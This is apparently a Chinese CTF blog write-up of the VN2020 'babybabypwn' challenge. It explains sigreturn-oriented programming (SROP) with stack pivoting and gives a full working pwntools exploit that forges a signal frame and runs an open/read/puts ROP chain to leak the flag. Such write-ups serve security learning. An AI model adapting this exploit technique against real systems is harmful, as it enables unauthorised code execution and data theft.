<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SROP+栈迁移_VN2020公开赛pwn | ScUpax0s</title><meta name="description" content="题目概览点击下载题目1.保护全开 2.过滤掉了59号系统调用（禁止execve） 3.给出了puts的地址 4.直接调用了15号系统调用（sigreturn) 攻击方式SROP主要存在于类Unix系统中。首次提出是在安全顶会Oakland 2014SROP原文 发生原理截取自原文：When the kernel delivers a signal, it suspends the process’"><meta name="keywords" content="SROP &amp;&amp; ORW"><meta name="author" content="Paxos"><meta name="copyright" content="Paxos"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="SROP+栈迁移_VN2020公开赛pwn"><meta name="twitter:description" content="题目概览点击下载题目1.保护全开 2.过滤掉了59号系统调用（禁止execve） 3.给出了puts的地址 4.直接调用了15号系统调用（sigreturn) 攻击方式SROP主要存在于类Unix系统中。首次提出是在安全顶会Oakland 2014SROP原文 发生原理截取自原文：When the kernel delivers a signal, it suspends the process’"><meta name="twitter:image" content="https://s1.ax1x.com/2020/06/16/NPdUZ6.png"><meta property="og:type" content="article"><meta property="og:title" content="SROP+栈迁移_VN2020公开赛pwn"><meta property="og:url" content="http://yoursite.com/2020/07/20/SROP-%E6%A0%88%E8%BF%81%E7%A7%BB-VN2020%E5%85%AC%E5%BC%80%E8%B5%9Bpwn/"><meta property="og:site_name" content="ScUpax0s"><meta property="og:description" content="题目概览点击下载题目1.保护全开 2.过滤掉了59号系统调用（禁止execve） 3.给出了puts的地址 4.直接调用了15号系统调用（sigreturn) 攻击方式SROP主要存在于类Unix系统中。首次提出是在安全顶会Oakland 2014SROP原文 发生原理截取自原文：When the kernel delivers a signal, it suspends the process’"><meta property="og:image" content="https://s1.ax1x.com/2020/06/16/NPdUZ6.png"><meta property="article:published_time" content="2020-07-20T05:03:39.000Z"><meta property="article:modified_time" content="2020-07-21T13:36:27.418Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://yoursite.com/2020/07/20/SROP-%E6%A0%88%E8%BF%81%E7%A7%BB-VN2020%E5%85%AC%E5%BC%80%E8%B5%9Bpwn/"><link rel="prev" title="easyTHeap(tcachebin)_VN公开赛" href="http://yoursite.com/2020/07/23/easyTHeap-tcachebin-VN%E5%85%AC%E5%BC%80%E8%B5%9B/"><link rel="next" title="Linux内核基础学习笔记" href="http://yoursite.com/2020/07/16/Linux%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  bookmark: {
    message_prev: 'Press',
    message_next: 'to bookmark this page'
  },
  runtime_unit: 'days',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://s1.ax1x.com/2020/06/15/N9ZTBV.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">27</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">14</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#题目概览"><span class="toc-number">1.</span> <span class="toc-text">题目概览</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击方式"><span class="toc-number">2.</span> <span class="toc-text">攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SROP"><span class="toc-number">2.1.</span> <span class="toc-text">SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#发生原理"><span class="toc-number">2.1.1.</span> <span class="toc-text">发生原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#用户态伪造signal-frame"><span class="toc-number">2.1.2.</span> <span class="toc-text">用户态伪造signal frame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#形成调用链"><span class="toc-number">2.1.3.</span> <span class="toc-text">形成调用链</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://s1.ax1x.com/2020/06/16/NPdUZ6.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">ScUpax0s</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">SROP+栈迁移_VN2020公开赛pwn</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2020-07-20 13:03:39"><i class="fa fa-calendar" aria-hidden="true"></i> Created 2020-07-20</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2020-07-21 21:36:27"><i class="fa fa-history" aria-hidden="true"></i> Updated 2020-07-21</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Buuoj/">Buuoj</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>Post View:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-comment-o" aria-hidden="true"></i><span>Comments:</span><span class="disqus-comment-count comment-count"><a href="http://yoursite.com/2020/07/20/SROP-%E6%A0%88%E8%BF%81%E7%A7%BB-VN2020%E5%85%AC%E5%BC%80%E8%B5%9Bpwn/#disqus_thread"></a></span></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="题目概览"><a href="#题目概览" class="headerlink" title="题目概览"></a>题目概览</h1><p><a href="/download/vn_pwn_babybabypwn_1">点击下载题目</a><br>1.保护全开</p>
<p>2.过滤掉了59号系统调用（禁止execve）</p>
<p>3.给出了<code>puts</code>的地址</p>
<p>4.直接调用了15号系统调用（sigreturn)<br><img src="https://s1.ax1x.com/2020/07/20/Uh30W8.png" alt=""></p>
<h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>主要存在于类Unix系统中。首次提出是在安全顶会Oakland 2014<a href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf" target="_blank" rel="noopener">SROP原文</a></p>
<h3 id="发生原理"><a href="#发生原理" class="headerlink" title="发生原理"></a>发生原理</h3><p>截取自原文：<em>When the kernel delivers a signal, it suspends the process’ normal execution and changes the user space CPU context such that the appropriate signal handler is called with the right arguments. When this signal handler returns, the original user space CPU context is restored. Specifically, a program returns from the handler using sigreturn, a ‘hidden system call’ on most UNIX-like systems, that reads a signal frame (struct sigframe) from the stack, put there by the kernel upon signal delivery. The frame contains all information needed for a safe return: the values of the registers, stack pointer, flags, etc.<br>The problem is that anyone who controls the stack is able to set up such a signal frame. By calling sigreturn, attackers may determine the next state for the program, and, as we shall see, chain together sigreturn and other system calls and to execute arbitrary code.</em><br>说白了就是这张图：<img src="https://s1.ax1x.com/2020/07/20/UhGGVA.png" alt=""><br>当内核发signal时，程序被挂起。然后切换进内核态做上下文保存（<strong>将所有寄存器以及signal信息以及sigreturn地址压栈</strong>）如下：<img src="https://s1.ax1x.com/2020/07/20/UhJiJP.png" alt="">这一部分是保存在<strong>用户空间</strong>的，之后跳转到Signal Handler处理signal。<strong>当Handler执行完毕后，返回rsp执行sigreturn</strong>（即原文中的<em>returns from the handler using sigreturn, a ‘hidden system call’</em>），而由于<em>kernel agnostic about signal handlers</em>所以内核并不会去记录这个signal对应的signal frame</p>
<h3 id="用户态伪造signal-frame"><a href="#用户态伪造signal-frame" class="headerlink" title="用户态伪造signal frame"></a>用户态伪造signal frame</h3><p>在x86-64位下伪造frame如下：<br><img src="https://s1.ax1x.com/2020/07/21/U5vVT1.png" alt="">当执行完signal handler后，会恢复上下文（用我们伪造的frame）当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell</p>
<h3 id="形成调用链"><a href="#形成调用链" class="headerlink" title="形成调用链"></a>形成调用链</h3><p>把syscall换成syscall；ret即可<img src="https://s1.ax1x.com/2020/07/21/U5xlCV.png" alt=""></p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>核心就是伪造fake frame让rip指向<code>read()</code>，控制rsp指向libc的bss段把栈拉过去。然后调用read在libc的bss段上读rop链，rop链中依次调用open、read、puts打出flag文件中的内容。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line"> </span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rls = <span class="keyword">lambda</span> n=<span class="number">2</span>**<span class="number">20</span>: io.recvlines(n)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = <span class="string">'/bin/zsh'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26200</span>)</span><br><span class="line"><span class="comment">#io = process("./vn_pwn_babybabypwn_1")</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"vn_pwn_babybabypwn_1"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/root/libc-2.23.so"</span>)</span><br><span class="line">ru(<span class="string">"Here is my gift: "</span>)</span><br><span class="line">r(<span class="number">2</span>)</span><br><span class="line">puts_addr = int(<span class="string">"0x0000"</span>+r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr: "</span>,hex(puts_addr)</span><br><span class="line"><span class="comment"># libc = LibcSearcher('puts',puts_addr)</span></span><br><span class="line"><span class="comment"># libc_base = puts_addr - libc.dump('puts') # 通过libcsearch确定了glibc版本2.23</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_libc = libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">offset = puts_addr - puts_libc</span><br><span class="line">read_addr = offset + libc.sym[<span class="string">'read'</span>]</span><br><span class="line">bss = libc.bss()    <span class="comment"># 因为程序开启pie，所以拉到libc的bss里</span></span><br><span class="line">bss_addr = bss+offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_libc: "</span>,hex(puts_libc)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"offset: "</span>,hex(offset)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"read_addr: "</span>,hex(read_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc's bss :"</span>,hex(bss)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc's bss_addr :"</span>,hex(bss_addr)</span><br><span class="line"></span><br><span class="line">rop_addr = bss_addr +<span class="number">0x500</span>    <span class="comment"># 把flag读到libc的bss+0x500</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line"><span class="comment"># 利用fake frame调用read（fd,*buf,size）把rop链读到bss上</span></span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = bss_addr</span><br><span class="line">frame.rdx = <span class="number">0x200</span></span><br><span class="line">frame.rip = read_addr</span><br><span class="line">frame.rsp = bss_addr <span class="comment"># 栈迁移</span></span><br><span class="line">ru(<span class="string">"Please input magic message: "</span>)</span><br><span class="line">s(str(frame)[<span class="number">8</span>:])   <span class="comment"># 发送fakeframe</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"rop_addr: "</span>,hex(rop_addr)</span><br><span class="line"></span><br><span class="line">open_addr = offset+libc.sym[<span class="string">'open'</span>]</span><br><span class="line">write_addr = offset+libc.sym[<span class="string">'write'</span>]</span><br><span class="line">flag_addr = bss_addr+<span class="number">0x78</span>   <span class="comment"># 'flag\x00'被写在0x8 * F + bss</span></span><br><span class="line">pop_rsi_ret = offset + <span class="number">0x00000000000202e8</span></span><br><span class="line">pop_rdi_ret = offset + <span class="number">0x0000000000021102</span></span><br><span class="line">pop_rdx_ret = offset + <span class="number">0x0000000000001b92</span></span><br><span class="line"><span class="comment"># 接下来调用open（“flag”，0）</span></span><br><span class="line">rop = flat(</span><br><span class="line">    p64(pop_rdi_ret),p64(flag_addr),p64(pop_rsi_ret),p64(<span class="number">0</span>),p64(open_addr), <span class="comment"># open</span></span><br><span class="line">    p64(pop_rdi_ret),p64(<span class="number">3</span>),p64(pop_rsi_ret),p64(rop_addr),p64(pop_rdx_ret),p64(<span class="number">0x50</span>),p64(read_addr),<span class="comment"># read to bss</span></span><br><span class="line">    p64(pop_rdi_ret),p64(rop_addr),p64(puts_addr),    <span class="comment"># puts</span></span><br><span class="line">    <span class="string">"flag\x00"</span></span><br><span class="line">)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">s(rop)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/carol2358/article/details/106438353?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/carol2358/article/details/106438353?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a></p>
<p><a href="https://www.freesion.com/article/1257461179/" target="_blank" rel="noopener">https://www.freesion.com/article/1257461179/</a></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Paxos</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/07/20/SROP-%E6%A0%88%E8%BF%81%E7%A7%BB-VN2020%E5%85%AC%E5%BC%80%E8%B5%9Bpwn/">http://yoursite.com/2020/07/20/SROP-%E6%A0%88%E8%BF%81%E7%A7%BB-VN2020%E5%85%AC%E5%BC%80%E8%B5%9Bpwn/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SROP-ORW/">SROP &amp;&amp; ORW</a></div><div class="post_share"><div class="social-share" data-image="https://s1.ax1x.com/2020/06/16/NPdUZ6.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> Donate<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/07/23/easyTHeap-tcachebin-VN%E5%85%AC%E5%BC%80%E8%B5%9B/"><img class="prev_cover" src="https://s1.ax1x.com/2020/06/16/NPdUZ6.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">easyTHeap(tcachebin)_VN公开赛</div></div></a></div><div class="next-post pull_right"><a href="/2020/07/16/Linux%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/"><img class="next_cover" src="https://s1.ax1x.com/2020/07/16/UDSEZ9.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Linux内核基础学习笔记</div></div></a></div></nav><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> Comment</span></div><div id="disqus_thread"></div><script>var disqus_config = function () {
  this.page.url = 'http://yoursite.com/2020/07/20/SROP-%E6%A0%88%E8%BF%81%E7%A7%BB-VN2020%E5%85%AC%E5%BC%80%E8%B5%9Bpwn/';
  this.page.identifier = '2020/07/20/SROP-栈迁移-VN2020公开赛pwn/';
  this.page.title = 'SROP+栈迁移_VN2020公开赛pwn';
};
(function() { 
  var d = document, s = d.createElement('script');
  s.src = 'https://ScUpax0s.disqus.com/embed.js';
  s.setAttribute('data-timestamp', +new Date());
  (d.head || d.body).appendChild(s);
})();
</script><script>function getDisqusCount() {
  var d = document, s = d.createElement('script');
  s.src = 'https://ScUpax0s.disqus.com/count.js';
  s.id = 'dsq-count-scr';
  (d.head || d.body).appendChild(s);
}

window.addEventListener('load', getDisqusCount, false);</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By Paxos</div><div class="framework-info"><span>Driven </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="Read Mode"></i><i class="fa fa-plus" id="font_plus" title="Increase font size"></i><i class="fa fa-minus" id="font_minus" title="Decrease font size"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="Traditional Chinese and Simplified Chinese Conversion" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="Dark Mode"></i></div><div id="rightside-config-show"><div id="rightside_config" title="Setting"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="Scroll to comment"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="Table of Contents" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="Back to top" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>